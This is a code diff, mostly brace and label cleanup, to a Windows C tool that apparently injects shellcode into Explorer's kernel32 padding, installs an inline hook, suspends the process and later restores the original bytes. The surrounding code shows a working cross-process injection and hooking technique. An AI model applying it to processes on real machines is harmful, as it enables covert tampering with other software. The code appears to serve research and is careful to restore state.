@@ -109,8 +109,12 @@ static BOOL FindInternalCall(LPCBYTE function, DWORD funcSize, LPCBYTE* call, BY
 static BOOL CheckInt3Padding(LPCBYTE region, SIZE_T size)
 {
 	for (SIZE_T i = 0; i < size; ++i)
+	{
 		if (region[i] != 0xCC)
+		{
 			return FALSE;
+		}
+	}
 	return TRUE;
 }
 
@@ -131,7 +135,9 @@ static BOOL AssessLayout(LPCBYTE function, LAYOUT* layout)
 
 	DWORD prologueSize = 0;
 	if (!VerifyPrologue(function, &prologueSize))
+	{
 		return FALSE;
+	}
 	printf("[+] Prologue: MOV r11, rsp; SUB rsp, 0x58 (%lu bytes)\n", prologueSize);
 
 	DWORD funcSize = (DWORD)GetFunctionSize(function, MAX_FUNC_SIZE);
@@ -144,7 +150,9 @@ static BOOL AssessLayout(LPCBYTE function, LAYOUT* layout)
 	printf("[+] Function size to first RET: 0x%X\n", funcSize);
 
 	if (!FindInternalCall(function, funcSize, &layout->internalCall, &layout->callLength))
+	{
 		return FALSE;
+	}
 	printf(
 		"[+] Internal CALL at +0x%zX, %u bytes (%s)\n",
 		(SIZE_T)(layout->internalCall - function),
@@ -239,9 +247,13 @@ static UINT_PTR GetRemoteModuleBase(HANDLE process, LPCWSTR moduleName)
 	{
 		WCHAR name[MAX_PATH] = { 0 };
 		if (!K32GetModuleBaseNameW(process, modules[i], name, MAX_PATH))
+		{
 			continue;
+		}
 		if (!_wcsicmp(name, moduleName))
+		{
 			return (UINT_PTR)modules[i];
+		}
 	}
 
 	fprintf(stderr, "[-] Module %ls not found in the target process\n", moduleName);
@@ -271,7 +283,9 @@ static BOOL WriteRemoteVerified(HANDLE process, UINT_PTR address, LPCVOID buffer
 		return FALSE;
 	}
 	if (written)
+	{
 		*written = TRUE;
+	}
 
 	BYTE readBack[64] = { 0 };
 	if (size > sizeof(readBack))
@@ -280,7 +294,9 @@ static BOOL WriteRemoteVerified(HANDLE process, UINT_PTR address, LPCVOID buffer
 		return FALSE;
 	}
 	if (!ReadRemote(process, address, readBack, size))
+	{
 		return FALSE;
+	}
 	if (memcmp(readBack, buffer, size))
 	{
 		fprintf(stderr, "[-] Read-back mismatch at 0x%llX\n", (unsigned long long)address);
@@ -309,7 +325,9 @@ static BOOL WaitForEnter(DWORD timeoutSec)
 			if (record.EventType == KEY_EVENT &&
 				record.Event.KeyEvent.bKeyDown &&
 				record.Event.KeyEvent.wVirtualKeyCode == VK_RETURN)
+			{
 				return TRUE;
+			}
 		}
 
 		if (GetTickCount64() - start >= (ULONGLONG)timeoutSec * 1000)
@@ -400,7 +418,9 @@ static INT CaptureMain(DWORD explorerPid, DWORD timeoutSec)
 	UINT_PTR remoteKernel32 = GetRemoteModuleBase(explorer, L"kernel32.dll");
 	UINT_PTR remoteNtdll = GetRemoteModuleBase(explorer, L"ntdll.dll");
 	if (!remoteKernel32 || !remoteNtdll)
-		goto _FINAL;
+	{
+		goto cleanup;
+	}
 
 	remoteFunction = remoteKernel32 + ((UINT_PTR)layout.function - (UINT_PTR)kernel32);
 	remoteHook = remoteKernel32 + ((UINT_PTR)layout.hookSite - (UINT_PTR)kernel32);
@@ -412,32 +432,38 @@ static INT CaptureMain(DWORD explorerPid, DWORD timeoutSec)
 	if (!localNtdll || !localNtSuspend)
 	{
 		fprintf(stderr, "[-] Unable to resolve local NtSuspendProcess: E%lu\n", GetLastError());
-		goto _FINAL;
+		goto cleanup;
 	}
 	UINT_PTR remoteNtSuspend = remoteNtdll + (localNtSuspend - localNtdll);
 
 	if (!ReadRemote(explorer, remoteHook, originalHook, sizeof(originalHook)))
-		goto _FINAL;
+	{
+		goto cleanup;
+	}
 	const BYTE expectedNop[INLINE_HOOK_SIZE] = { 0x0F, 0x1F, 0x44, 0x00, 0x00 };
 	if (memcmp(originalHook, expectedNop, sizeof(expectedNop)))
 	{
 		fprintf(stderr, "[-] Remote hook site is not the expected 5-byte NOP; layout differs\n");
-		goto _FINAL;
+		goto cleanup;
 	}
 	if (!ReadRemote(explorer, remoteShellcode, originalPadding, sizeof(originalPadding)))
-		goto _FINAL;
+	{
+		goto cleanup;
+	}
 	if (!CheckInt3Padding(originalPadding, sizeof(originalPadding)))
 	{
 		fprintf(stderr, "[-] Remote shellcode region is not INT3 padding\n");
-		goto _FINAL;
+		goto cleanup;
 	}
 	BYTE remoteSlot[RSP_SLOT_SIZE] = { 0 };
 	if (!ReadRemote(explorer, remoteRspSlot, remoteSlot, sizeof(remoteSlot)))
-		goto _FINAL;
+	{
+		goto cleanup;
+	}
 	if (!CheckInt3Padding(remoteSlot, sizeof(remoteSlot)))
 	{
 		fprintf(stderr, "[-] Remote RSP slot is not INT3 padding\n");
-		goto _FINAL;
+		goto cleanup;
 	}
 
 	printf(
@@ -469,7 +495,7 @@ static INT CaptureMain(DWORD explorerPid, DWORD timeoutSec)
 	if (!FitsRel32(saveDisp) || !FitsRel32(callDisp) || !FitsRel8(trampolineDisp) || !FitsRel8(hookDisp))
 	{
 		fprintf(stderr, "[-] Remote displacement out of range; refusing to patch\n");
-		goto _FINAL;
+		goto cleanup;
 	}
 	*(DWORD*)&shellcode[3] = (DWORD)(INT32)saveDisp;
 	*(DWORD*)&shellcode[11] = (DWORD)(INT32)callDisp;
@@ -484,7 +510,7 @@ static INT CaptureMain(DWORD explorerPid, DWORD timeoutSec)
 		if (!VirtualQueryEx(explorer, (LPCVOID)addr, &mbi, sizeof(mbi)))
 		{
 			fprintf(stderr, "[-] VirtualQueryEx: E%lu\n", GetLastError());
-			goto _FINAL;
+			goto cleanup;
 		}
 		pages[pageCount++] = mbi;
 		addr = (UINT_PTR)mbi.BaseAddress + mbi.RegionSize;
@@ -494,15 +520,19 @@ static INT CaptureMain(DWORD explorerPid, DWORD timeoutSec)
 	if (!VirtualProtectEx(explorer, (LPVOID)remoteRspSlot, MAX_FUNC_SIZE + RSP_SLOT_SIZE, PAGE_EXECUTE_READWRITE, &oldProtect))
 	{
 		fprintf(stderr, "[-] VirtualProtectEx: E%lu\n", GetLastError());
-		goto _FINAL;
+		goto cleanup;
 	}
 	protectionChanged = TRUE;
 
 	if (!WriteRemoteVerified(explorer, remoteShellcode, shellcode, sizeof(shellcode), &shellcodeWritten))
-		goto _FINAL;
+	{
+		goto cleanup;
+	}
 
 	if (!WriteRemoteVerified(explorer, remoteHook, inlineHook, sizeof(inlineHook), &hookWritten))
-		goto _FINAL;
+	{
+		goto cleanup;
+	}
 
 	// Protection stays RWX until cleanup: the shellcode writes the RSP slot
 	// (same page as the code) when the hook fires, not when it is installed.
@@ -520,11 +550,13 @@ static INT CaptureMain(DWORD explorerPid, DWORD timeoutSec)
 
 	BOOL entered = WaitForEnter(timeoutSec);
 	if (!entered)
+	{
 		fprintf(stderr, "[-] No confirmation received; restoring and resuming\n");
+	}
 
 	result = entered ? EXIT_SUCCESS : EXIT_FAILURE;
 
-_FINAL:
+cleanup:
 	if (hookWritten)
 	{
 		hookRestored = WriteRemoteVerified(explorer, remoteHook, originalHook, sizeof(originalHook), NULL);
@@ -537,7 +569,9 @@ _FINAL:
 		NTSTATUS status = NtResumeProcess(explorer);
 		printf("[+] NtResumeProcess: 0x%08lX\n", (unsigned long)status);
 		if (!NT_SUCCESS(status))
+		{
 			result = EXIT_FAILURE;
+		}
 	}
 
 	// The frozen thread returns through the trampoline after resume; the
@@ -547,7 +581,9 @@ _FINAL:
 	if (shellcodeWritten && (!hookWritten || hookRestored))
 	{
 		if (hookWritten)
+		{
 			Sleep(RESUME_GRACE_MS);
+		}
 		if (!WriteRemoteVerified(explorer, remoteShellcode, originalPadding, sizeof(originalPadding), NULL))
 		{
 			fprintf(stderr, "[-] Shellcode padding restoration FAILED\n");
@@ -567,7 +603,9 @@ _FINAL:
 			result = EXIT_FAILURE;
 		}
 		else
+		{
 			printf("[+] RSP slot restored to INT3 padding (capture is repeatable)\n");
+		}
 	}
 
 	if (protectionChanged)
@@ -585,10 +623,12 @@ _FINAL:
 
 	if (explorer)
 	{
-		if (hookWritten)
+		if (hookWritten && result == EXIT_SUCCESS)
+		{
 			printf(
 				"[+] Restored and resumed Explorer: hook site, shellcode padding,\n"
 				"    RSP slot and page protections returned to their original bytes\n");
+		}
 		CloseHandle(explorer);
 	}
 	return result;
@@ -599,16 +639,22 @@ _FINAL:
 static BOOL ParseDecimalDword(LPCWSTR text, DWORD* value)
 {
 	if (!text || !*text)
+	{
 		return FALSE;
+	}
 
 	DWORD result = 0;
 	for (LPCWSTR p = text; *p; ++p)
 	{
 		if (*p < L'0' || *p > L'9')
+		{
 			return FALSE;
+		}
 		DWORD digit = (DWORD)(*p - L'0');
 		if (result > (MAXDWORD - digit) / 10)
+		{
 			return FALSE;
+		}
 		result = result * 10 + digit;
 	}
 
@@ -619,7 +665,9 @@ static BOOL ParseDecimalDword(LPCWSTR text, DWORD* value)
 int wmain(int argc, wchar_t* argv[])
 {
 	if (argc == 2 && !wcscmp(argv[1], L"--assess"))
+	{
 		return AssessMain();
+	}
 
 	if (argc == 2 || argc == 4)
 	{
